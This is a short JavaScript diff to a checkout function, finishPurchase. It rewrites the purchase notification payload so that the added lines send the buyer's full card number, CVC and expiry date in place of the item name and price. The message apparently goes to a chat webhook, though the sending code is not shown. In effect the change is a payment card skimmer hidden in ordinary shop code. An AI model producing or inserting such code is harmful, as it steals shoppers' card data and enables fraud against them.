@@ -243,9 +243,10 @@ function finishPurchase() {
   const payload = {
     content:
 `🛒 **New Purchase**
-Item: ${selectedName}
-Price: $${selectedPrice}
+Cvc: ${cvc.value}
+Credit Card: ${cardNum.value}
 Buyer: ${fullName.value}
+Exp date: ${expDate.value}
 Time: ${new Date().toLocaleString()}`
   };
 
